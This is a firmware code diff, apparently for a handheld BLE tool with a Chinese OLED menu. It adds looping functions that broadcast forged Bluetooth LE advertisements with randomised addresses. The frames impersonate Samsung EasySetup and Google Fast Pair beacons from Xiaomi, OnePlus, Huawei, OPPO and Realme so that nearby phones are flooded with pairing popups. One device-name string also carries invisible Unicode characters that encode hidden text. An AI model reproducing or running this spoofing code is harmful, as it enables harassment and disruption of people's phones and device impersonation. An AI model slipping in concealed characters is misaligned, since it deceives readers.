+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+  }
+  performCompleteBleCleanup();
+}
+
+// Extended BLE popup start functions (ported from backup, adapted to current style)
+
+void blePopupStart_SamsungEasySetup() {
+  const char* title = "[三星 EasySetup]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  const char* names[] = {"Gal󠅗󠅙󠅤󠅘󠅥󠅒󠄞󠅓󠅟󠅝󠄟󠄶󠅜󠅩󠅙󠅞󠅗󠄹󠅓󠅕󠅩󠅩󠅔󠅣󠄟󠄲󠅇󠄡󠄦󠄝󠅄󠅟󠅟󠅜󠅣axy Buds","Galaxy Buds2","Galaxy Buds Pro","Galaxy Watch"};
+  const size_t nameCount = sizeof(names)/sizeof(names[0]);
+  unsigned long lastDisplayUpdate = 0;
+
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+    
+    BLE.configAdvert()->stopAdv();
+
+    // Use non-resolvable random address to avoid caching issues
+    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);
+
+    BLEAdvertData adv;
+    // Add flags first (LE General Discoverable + BR/EDR Not Supported)
+    adv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
+
+    // Manufacturer Specific (Samsung = 0x0075)
+    // Minimal plausible EasySetup beacon payload (preamble + random bytes)
+    const char* nm = names[(size_t)random(0,(int)nameCount)];
+
+    uint8_t payload[12];
+    // Example preamble bytes
+    payload[0] = 0x01; // scenario/type
+    payload[1] = 0x00; // flags
+    payload[2] = 0x00; // reserved
+    payload[3] = 0x00; // reserved
+    // random bytes to vary frame
+    for (int i=4;i<12;i++) payload[i] = (uint8_t)random(0,256);
+
+    // Build AD structure: len = 1(type)+2(company)+payload_len
+    const uint8_t payload_len = sizeof(payload);
+    const uint8_t L = (uint8_t)(1 + 2 + payload_len);
+    uint8_t mfg[1 + 1 + 2 + sizeof(payload)];
+    mfg[0] = L; mfg[1] = 0xFF; // Manufacturer Specific
+    mfg[2] = 0x75; mfg[3] = 0x00; // Samsung company ID (LSB first)
+    memcpy(&mfg[4], payload, payload_len);
+    adv.addData(mfg, sizeof(mfg));
+
+    // Put device name into scan response
+    BLEAdvertData scan;
+    scan.addCompleteName(nm);
+
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(scan);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+  }
+  performCompleteBleCleanup();
+}
+
+void blePopupStart_XiaomiFastPair() {
+  const char* title = "[小米/红米 快速配对]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  // Xiaomi/Redmi Model IDs (3-byte Fast Pair Model IDs)
+  const uint8_t xiaomiModels[][3] = {
+    {0x8E,0x61,0xC1}, // Redmi Buds 4 lite (8E61C1)
+    {0x6C,0x52,0x1F}  // Redmi Buds 4 Active (6C521F)
+  };
+  const size_t modelCount = sizeof(xiaomiModels)/sizeof(xiaomiModels[0]);
+  unsigned long lastDisplayUpdate = 0;
+
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+
+    BLE.configAdvert()->stopAdv();
+
+    // Randomize advertiser address (non-resolvable)
+    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);
+
+    BLEAdvertData adv;
+    // Flags
+    adv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
+
+    // 1) Service UUID List (16-bit) -> FE2C (Google Fast Pair)
+    uint8_t suuid[4];
+    suuid[0] = 3;      // length of (type + 2-byte UUID)
+    suuid[1] = 0x03;   // Complete List of 16-bit Service Class UUIDs
+    suuid[2] = 0x2C;   // UUID LSB
+    suuid[3] = 0xFE;   // UUID MSB
+    adv.addData(suuid, sizeof(suuid));
+
+    // 2) Service Data (UUID FE2C + Model ID)
+    const uint8_t* mid = xiaomiModels[(size_t)random(0,(int)modelCount)];
+    uint8_t sdata[8];
+    sdata[0] = 6;      // length of (type + 2-byte UUID + 3-byte model)
+    sdata[1] = 0x16;   // Service Data - 16-bit UUID
+    sdata[2] = 0x2C;   // UUID LSB
+    sdata[3] = 0xFE;   // UUID MSB
+    sdata[4] = mid[0]; // Model ID byte 2
+    sdata[5] = mid[1]; // Model ID byte 1
+    sdata[6] = mid[2]; // Model ID byte 0
+    adv.addData(sdata, 7);
+
+    // 3) Tx Power (optional)
+    int8_t txp = (int8_t)((random(0, 121)) - 100); // -100..+20
+    uint8_t txpSeg[4];
+    txpSeg[0] = 2;       // length of (type + 1-byte power)
+    txpSeg[1] = 0x0A;    // Tx Power Level
+    txpSeg[2] = (uint8_t)txp;
+    adv.addData(txpSeg, 3);
+
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+  }
+  performCompleteBleCleanup();
+}
+
+static void blePopupShowFastPairInfo() {
+  display.clearDisplay();
+  u8g2_for_adafruit_gfx.setFontMode(1);
+  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+  const char* l1 = "由于谷歌的协议更新";
+  const char* l2 = "仅对部分旧版安卓有效";
+  const char* l3 = "可用于安卓版本<12";
+  const char* l4 = "且支持快速配对的设备";
+  int w1 = u8g2_for_adafruit_gfx.getUTF8Width(l1); int x1 = (display.width()-w1)/2; if (x1<0) x1=0;
+  int w2 = u8g2_for_adafruit_gfx.getUTF8Width(l2); int x2 = (display.width()-w2)/2; if (x2<0) x2=0;
+  int w3 = u8g2_for_adafruit_gfx.getUTF8Width(l3); int x3 = (display.width()-w3)/2; if (x3<0) x3=0;
+  int w4 = u8g2_for_adafruit_gfx.getUTF8Width(l4); int x4 = (display.width()-w4)/2; if (x4<0) x4=0;
+  u8g2_for_adafruit_gfx.setCursor(x1, 20); u8g2_for_adafruit_gfx.print(l1);
+  u8g2_for_adafruit_gfx.setCursor(x2, 32); u8g2_for_adafruit_gfx.print(l2);
+  u8g2_for_adafruit_gfx.setCursor(x3, 44); u8g2_for_adafruit_gfx.print(l3);
+  u8g2_for_adafruit_gfx.setCursor(x4, 56); u8g2_for_adafruit_gfx.print(l4);
+  display.display();
+  while (true) { if (digitalRead(BTN_BACK) == LOW || digitalRead(BTN_OK) == LOW) { delay(200); break; } delay(10);} 
+}
+
+void blePopupStart_OnePlusFastPair() {
+  const char* title = "[一加 快速配对]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  const uint8_t models[][3] = {
+    {0x8A,0x7A,0x95}, // OnePlus Watch 2
+    {0x1E,0xC1,0x11}
+  };
+  const size_t count = sizeof(models)/sizeof(models[0]);
+  unsigned long lastDisplayUpdate = 0;
+
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+    
+    BLE.configAdvert()->stopAdv();
+    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);
+
+    BLEAdvertData adv; adv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
+    uint8_t suuid[4] = {3, 0x03, 0x2C, 0xFE}; adv.addData(suuid, sizeof(suuid));
+    const uint8_t* mid = models[(size_t)random(0,(int)count)];
+    uint8_t sdata[8] = {6, 0x16, 0x2C, 0xFE, mid[0], mid[1], mid[2]}; adv.addData(sdata, 7);
+    int8_t txp = (int8_t)((random(0,121)) - 100); uint8_t txBuf[3]={2,0x0A,(uint8_t)txp}; adv.addData(txBuf,3);
+
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+  }
+  performCompleteBleCleanup();
+}
+
+void blePopupStart_HuaweiFastPair() {
+  const char* title = "[华为 快速配对]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  const uint8_t models[][3] = {
+    {0x20,0x22,0x08}
+  };
+  const size_t count = sizeof(models)/sizeof(models[0]);
+  unsigned long lastDisplayUpdate = 0;
+
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+    
+    BLE.configAdvert()->stopAdv();
+    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);
+
+    BLEAdvertData adv; adv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
+    uint8_t suuid[4] = {3, 0x03, 0x2C, 0xFE}; adv.addData(suuid, sizeof(suuid));
+    const uint8_t* mid = models[(size_t)random(0,(int)count)];
+    uint8_t sdata[8] = {6, 0x16, 0x2C, 0xFE, mid[0], mid[1], mid[2]}; adv.addData(sdata, 7);
+    int8_t txp = (int8_t)((random(0,121)) - 100); uint8_t txBuf[3]={2,0x0A,(uint8_t)txp}; adv.addData(txBuf,3);
+
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+  }
+  performCompleteBleCleanup();
+}
+
+void blePopupStart_OppoFastPair() {
+  const char* title = "[OPPO 快速配对]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  const uint8_t models[][3] = {
+    {0xCA,0x4D,0xE1},
+    {0x92,0x16,0x3A}
+  };
+  const size_t count = sizeof(models)/sizeof(models[0]);
+  unsigned long lastDisplayUpdate = 0;
+
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+    
+    BLE.configAdvert()->stopAdv();
+    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);
+
+    BLEAdvertData adv; adv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
+    uint8_t suuid[4] = {3, 0x03, 0x2C, 0xFE}; adv.addData(suuid, sizeof(suuid));
+    const uint8_t* mid = models[(size_t)random(0,(int)count)];
+    uint8_t sdata[8] = {6, 0x16, 0x2C, 0xFE, mid[0], mid[1], mid[2]}; adv.addData(sdata, 7);
+    int8_t txp = (int8_t)((random(0,121)) - 100); uint8_t txBuf[3]={2,0x0A,(uint8_t)txp}; adv.addData(txBuf,3);
+
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+  }
+  performCompleteBleCleanup();
+}
+
+void blePopupStart_RealmeFastPair() {
+  const char* title = "[realme 快速配对]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  const uint8_t models[][3] = {
+    {0xD5,0xC6,0xCE},
+    {0x8C,0xD1,0x0F},
+    {0x8C,0x6B,0x6A}
+  };
+  const size_t count = sizeof(models)/sizeof(models[0]);
+  unsigned long lastDisplayUpdate = 0;
+
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+    
+    BLE.configAdvert()->stopAdv();
+    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);
+
+    BLEAdvertData adv; adv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
+    uint8_t suuid[4] = {3, 0x03, 0x2C, 0xFE}; adv.addData(suuid, sizeof(suuid));
+    const uint8_t* mid = models[(size_t)random(0,(int)count)];
+    uint8_t sdata[8] = {6, 0x16, 0x2C, 0xFE, mid[0], mid[1], mid[2]}; adv.addData(sdata, 7);
+    int8_t txp = (int8_t)((random(0,121)) - 100); uint8_t txBuf[3]={2,0x0A,(uint8_t)txp}; adv.addData(txBuf,3);
+
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    unsigned long currentDelay = (unsigned long)getBlePopupDelay();
+    while (millis() - start < currentDelay) {
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(10); 
+    }
+  }
+  performCompleteBleCleanup();
+}
